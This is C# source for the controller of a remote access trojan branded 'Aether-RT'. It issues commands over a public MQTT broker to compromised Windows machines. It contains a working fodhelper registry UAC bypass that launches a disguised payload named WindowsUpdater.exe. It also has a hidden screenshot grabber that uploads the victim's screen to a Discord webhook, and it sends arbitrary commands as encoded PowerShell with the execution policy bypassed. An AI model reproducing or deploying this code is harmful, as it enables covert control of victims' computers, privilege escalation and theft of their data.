using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Globalization;
using MQTTnet;
using MQTTnet.Client;

class MachineInfo {
    public string Name { get; set; }
    public string OS { get; set; }
    public string IP { get; set; }
    public DateTime LastSeen { get; set; }
    public bool IsElevated { get; set; }
}

class StatsWindow : Form {
    private List<float> cpuHistory = new List<float>();
    private List<float> ramHistory = new List<float>();
    private List<float> gpuHistory = new List<float>();
    private List<float> uploadHistory = new List<float>();
    private List<float> downloadHistory = new List<float>();
    private System.Windows.Forms.Timer refreshTimer = new System.Windows.Forms.Timer();
    public StatsWindow(string target) {
        this.Text = $"Live Stats: {target}"; this.Size = new Size(400, 530);
        this.FormBorderStyle = FormBorderStyle.FixedToolWindow; this.TopMost = true; this.BackColor = Color.Black; this.DoubleBuffered = true;
        this.Paint += (s, e) => DrawGraphs(e.Graphics);
        refreshTimer.Interval = 500; refreshTimer.Tick += (s, e) => this.Invalidate(); refreshTimer.Start();
    }
    public void UpdateData(float c, float r, float g, float up, float down) {
        if (this.IsDisposed) return;
        if (this.InvokeRequired) { this.BeginInvoke(new Action(() => UpdateData(c, r, g, up, down))); return; }
        cpuHistory.Add(c); if (cpuHistory.Count > 50) cpuHistory.RemoveAt(0);
        ramHistory.Add(r); if (ramHistory.Count > 50) ramHistory.RemoveAt(0);
        gpuHistory.Add(g); if (gpuHistory.Count > 50) gpuHistory.RemoveAt(0);
        uploadHistory.Add(up); if (uploadHistory.Count > 50) uploadHistory.RemoveAt(0);
        downloadHistory.Add(down); if (downloadHistory.Count > 50) downloadHistory.RemoveAt(0);
    }
    private void DrawGraphs(Graphics g) {
        g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;
        DrawGraph(g, "CPU Usage", cpuHistory, Color.Lime, 30, "%");
        DrawGraph(g, "RAM Usage", ramHistory, Color.Cyan, 130, "%");
        DrawGraph(g, "GPU/Other", gpuHistory, Color.Yellow, 230, "%");
        DrawGraph(g, "Upload", uploadHistory, Color.Blue, 330, " KB/s");
        DrawGraph(g, "Download", downloadHistory, Color.Lime, 430, " KB/s");
    }
    private void DrawGraph(Graphics g, string label, List<float> data, Color color, int y, string unit) {
        float val = (data.Count > 0) ? data.Last() : 0;
        g.DrawString($"{label}: {val:F1}{unit}", SystemFonts.DefaultFont, new SolidBrush(color), 10, y - 18);
        g.DrawRectangle(new Pen(Color.DimGray), 10, y, 360, 70);
        if (data.Count < 2) return;
        PointF[] pts = new PointF[data.Count];
        float max = (unit == "%") ? 100 : Math.Max(data.Max(), 10);
        for (int i = 0; i < data.Count; i++) pts[i] = new PointF(10 + (i * 7.2f), y + 70 - (Math.Min(data[i], max) / max * 70));
        g.DrawLines(new Pen(color, 2), pts);
    }
}

class Controller
{
    static string secretId = "YOUR_UNIQUE_SECRET_ID_HERE";
    static ConcurrentDictionary<string, MachineInfo> activeMachines = new ConcurrentDictionary<string, MachineInfo>();
    static string selectedMachine = "";
    static StatsWindow currentStatsWindow = null;
    static bool pollingStats = false;
    static string savedWebhook = "";
    static long lastReceivedBytes = 0;
    static long lastSentBytes = 0;

    static async Task Main(string[] args)
    {
        Console.OutputEncoding = Encoding.UTF8;
        PrintHeader();
        var mqttFactory = new MqttFactory();
        using (var mqttClient = mqttFactory.CreateMqttClient())
        {
            var options = new MqttClientOptionsBuilder().WithTcpServer("broker.hivemq.com").Build();
            mqttClient.ApplicationMessageReceivedAsync += e => {
                string t = e.ApplicationMessage.Topic;
                string p = Encoding.UTF8.GetString(e.ApplicationMessage.PayloadSegment).Trim();
                if (t.EndsWith("/discovery")) {
                    string[] s = p.Split('|');
                    if (s.Length >= 3) {
                        bool elev = s.Length >= 4 && s[3].Equals("True", StringComparison.OrdinalIgnoreCase);
                        activeMachines[s[0]] = new MachineInfo { Name = s[0], OS = s[1], IP = s[2], LastSeen = DateTime.Now, IsElevated = elev };
                    }
                }
                else if (t.Contains("/res")) {
                    if (p.Contains("STATS:")) {
                        try {
                            string statsLine = p.Split('\n', '\r').FirstOrDefault(l => l.Contains("STATS:"));
                            if (statsLine != null) {
                                string[] s = statsLine.Trim().Substring(6).Split('|');
                                if (s.Length >= 5) {
                                    float cpu = float.Parse(s[0].Trim(), CultureInfo.InvariantCulture); 
                                    float ram = float.Parse(s[1].Trim(), CultureInfo.InvariantCulture);
                                    long recvBytes = long.Parse(s[3].Trim());
                                    long sentBytes = long.Parse(s[4].Trim());
                                    float downloadSpeed = 0;
                                    float uploadSpeed = 0;
                                    if (lastReceivedBytes > 0) downloadSpeed = Math.Max(0, (recvBytes - lastReceivedBytes) / 1024f / 5f);
                                    if (lastSentBytes > 0) uploadSpeed = Math.Max(0, (sentBytes - lastSentBytes) / 1024f / 5f);
                                    lastReceivedBytes = recvBytes;
                                    lastSentBytes = sentBytes;
                                    currentStatsWindow?.UpdateData(cpu, ram, 0, uploadSpeed, downloadSpeed);
                                }
                            }
                        } catch { }
                    } else if (!string.IsNullOrWhiteSpace(p)) {
                        Console.ForegroundColor = ConsoleColor.Cyan; Console.WriteLine($"\n[OUTPUT]:\n{p}"); Console.ResetColor();
                        WritePrompt();
                    }
                }
                return Task.CompletedTask;
            };
            await mqttClient.ConnectAsync(options);
            await mqttClient.SubscribeAsync($"{secretId}/discovery");
            await mqttClient.SubscribeAsync($"{secretId}/+/res");
            while (true) {
                WritePrompt();
                string input = Console.ReadLine();
                if (string.IsNullOrEmpty(input)) continue;
                if (input.StartsWith("/")) { await HandleCmd(input, mqttClient); continue; }
                if (input.ToLower() == "mls") { ShowSelectionMenu(); continue; }
                if (string.IsNullOrEmpty(selectedMachine)) { Console.WriteLine("Select target."); continue; }
                await Send(input, mqttClient);
            }
        }
    }

    static async Task HandleCmd(string cmd, IMqttClient c) {
        switch (cmd.ToLower()) {
            case "/help":
                ShowHelp();
                break;
            case "/stats":
                if (string.IsNullOrEmpty(selectedMachine)) return;
                if (currentStatsWindow == null || currentStatsWindow.IsDisposed) {
                    ManualResetEvent ready = new ManualResetEvent(false);
                    Thread t = new Thread(() => { 
                        Application.EnableVisualStyles(); 
                        var win = new StatsWindow(selectedMachine);
                        currentStatsWindow = win;
                        ready.Set();
                        Application.Run(win); 
                    });
                    t.SetApartmentState(ApartmentState.STA); t.Start();
                    ready.WaitOne(2000); // Ensure window is created before polling
                    StartPolling(c);
                }
                break;
            case "/screenshot":
                if (string.IsNullOrEmpty(savedWebhook)) { Console.Write("Enter Discord Webhook: "); savedWebhook = Console.ReadLine(); }
                if (string.IsNullOrEmpty(savedWebhook)) break;
                string ssScript = "Add-Type -AssemblyName System.Drawing,System.Windows.Forms; " +
                                  "$s = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; " +
                                  "$b = New-Object Drawing.Bitmap($s.Width, $s.Height); " +
                                  "$g = [Drawing.Graphics]::FromImage($b); " +
                                  "$g.CopyFromScreen(0,0,0,0,$b.Size); " +
                                  "$f = [IO.Path]::Combine([IO.Path]::GetTempPath(), 's.png'); " +
                                  "$b.Save($f, [Drawing.Imaging.ImageFormat]::Png); " +
                                  "$b.Dispose(); $g.Dispose(); " +
                                  "curl.exe --silent -F \"file=@$f\" " + savedWebhook + " > $null; " +
                                  "Remove-Item $f -ErrorAction SilentlyContinue";
                await SendEncoded(ssScript, c);
                break;
            case "/info": await Send("systeminfo", c); break;
            case "/list": await Send("tasklist", c); break;
            case "/clear": PrintHeader(); break;
            case "/exit": Environment.Exit(0); break;
            case "/uacbypass":
                if (string.IsNullOrEmpty(selectedMachine)) return;
                string uacBypassScript = "reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /v \"DelegateExecute\" /f; " +
                                         "reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /d \"$env:APPDATA\\WindowsUpdater.exe\" /f; " +
                                         "start-process \"C:\\Windows\\System32\\fodhelper.exe\" -WindowStyle Hidden; " +
                                         "Start-Sleep -Seconds 2; " +
                                         "reg delete \"HKCU\\Software\\Classes\\ms-settings\" /f";
                await SendEncoded(uacBypassScript, c);
                Console.WriteLine("UAC Bypass command sent. Note: This attempts to gain elevated privileges. Use responsibly.");
                break;
        }
    }

    static void StartPolling(IMqttClient c) {
        if (pollingStats) return; pollingStats = true;
        Task.Run(async () => {
            string pollScript = "$p = (Get-WmiObject Win32_Processor | Measure-Object LoadPercentage -Average).Average; " +
                               "$m = Get-WmiObject Win32_OperatingSystem; " +
                               "$u = ($m.TotalVisibleMemorySize - $m.FreePhysicalMemory) / $m.TotalVisibleMemorySize * 100; " +
                               "$n = (Get-NetAdapterStatistics | Measure-Object ReceivedBytes -Sum).Sum; " +
                               "$s = (Get-NetAdapterStatistics | Measure-Object SentBytes -Sum).Sum; " +
                               "\"STATS:$([math]::Round($p,1))|$([math]::Round($u,1))|0|$n|$s\" -replace ',', '.'";
            while (currentStatsWindow != null && !currentStatsWindow.IsDisposed) {
                await SendEncoded(pollScript, c);
                await Task.Delay(5000);
            }
            pollingStats = false;
        });
    }

    static async Task SendEncoded(string script, IMqttClient c) {
        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
        await Send("powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand " + b64, c);
    }

    static async Task Send(string m, IMqttClient c) => await c.PublishAsync(new MqttApplicationMessageBuilder().WithTopic($"{secretId}/{selectedMachine}/cmd").WithPayload(m).Build());
    
    static void PrintHeader() { 
        Console.Clear(); 
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.WriteLine(@"
    ╔═══════════════════════════════════════════════════════╗
    ║                                                       ║
    ║   ░█████╗░███████╗████████╗██╗  ██╗███████╗██████╗    ║
    ║   ██╔══██╗██╔════╝╚══██╔══╝██║  ██║██╔════╝██╔══██╗   ║
    ║   ███████║█████╗     ██║   ███████║█████╗  ██████╔╝   ║
    ║   ██╔══██║██╔══╝     ██║   ██╔══██║██╔══╝  ██╔══██╗   ║
    ║   ██║  ██║███████╗   ██║   ██║  ██║███████╗██║  ██║   ║
    ║   ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ║
    ║                          - RT                         ║
    ║   Advanced Remote Terminal Control System             ║
    ║                                                       ║
    ╚═══════════════════════════════════════════════════════╝
");
        Console.ResetColor();
        Console.WriteLine();
    }
    
    static void ShowHelp() {
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.WriteLine("\n┌─────────────────────────────────────────────────────┐");
        Console.WriteLine("│              AETHER-RT COMMAND REFERENCE              │");
        Console.WriteLine("└─────────────────────────────────────────────────────┘");
        Console.ResetColor();
        
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine("\n► GENERAL COMMANDS:");
        Console.ResetColor();
        Console.WriteLine("  mls                    - List available machines");
        Console.WriteLine("  /help                  - Display this help menu");
        Console.WriteLine("  /clear                 - Clear the screen");
        Console.WriteLine("  /exit                  - Exit the application");
        
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine("\n► MACHINE INFORMATION:");
        Console.ResetColor();
        Console.WriteLine("  /info                  - Get system information");
        Console.WriteLine("  /list                  - Get running processes");
        Console.WriteLine("  /stats                 - Display live statistics (CPU, RAM, Network)");
        Console.WriteLine("  /uacbypass             - Attempt to bypass UAC on the target machine (use with caution!)");
        
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine("\n► REMOTE OPERATIONS:");
        Console.ResetColor();
        Console.WriteLine("  /screenshot            - Capture and upload screenshot to Discord");
        
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine("\n► STANDARD COMMANDS:");
        Console.ResetColor();
        Console.WriteLine("  Any other command will be executed on the target machine\n");
        
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.WriteLine("═══════════════════════════════════════════════════────═\n");
        Console.ResetColor();
    }
    
    static void WritePrompt() { 
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.Write($"[aether-rt");
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.Write($"@{(string.IsNullOrEmpty(selectedMachine) ? "DISCONNECTED" : selectedMachine)}");
        if (!string.IsNullOrEmpty(selectedMachine) && activeMachines.TryGetValue(selectedMachine, out var machine) && machine.IsElevated) {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write(" ROOT");
        }
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.Write("]$ ");
        Console.ResetColor();
    }
    
    static void ShowSelectionMenu() {
        var list = activeMachines.Values.Where(x => (DateTime.Now - x.LastSeen).TotalSeconds < 15).ToList();
        if (!list.Any()) { 
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("✗ No available machines found");
            Console.ResetColor();
            return; 
        }
        int i=0; 
        while(true) {
            Console.Clear(); 
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("╔════════════════════════════════════════╗");
            Console.WriteLine("║     SELECT TARGET MACHINE              ║");
            Console.WriteLine("╠════════════════════════════════════════╣");
            Console.ResetColor();
            for(int k=0; k<list.Count; k++){ 
                if(k==i){ 
                    Console.ForegroundColor=ConsoleColor.Blue;
                    Console.BackgroundColor=ConsoleColor.White; 
                    Console.ForegroundColor=ConsoleColor.Black;
                    Console.WriteLine($"║ ► {list[k].Name.PadRight(34)} ║"); 
                    Console.ResetColor();
                } else {
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine($"║   {list[k].Name.PadRight(34)} ║");
                    Console.ResetColor();
                }
            }
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("╠════════════════════════════════════════╣");
            Console.WriteLine("║ ↑/↓ Navigate | Enter Select | Esc Exit ║");
            Console.WriteLine("╚════════════════════════════════════════╝");
            Console.ResetColor();
            var key = Console.ReadKey(true).Key; 
            if(key==ConsoleKey.UpArrow && i>0) i--; 
            else if(key==ConsoleKey.DownArrow && i<list.Count-1) i++; 
            else if(key==ConsoleKey.Enter){ 
                selectedMachine=list[i].Name; 
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"\n✓ Connected to: {selectedMachine}\n");
                Console.ResetColor();
                PrintHeader(); 
                break; 
            } else if(key==ConsoleKey.Escape) {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("\n⊗ Connection cancelled\n");
                Console.ResetColor();
                break;
            }
        }
    }
}
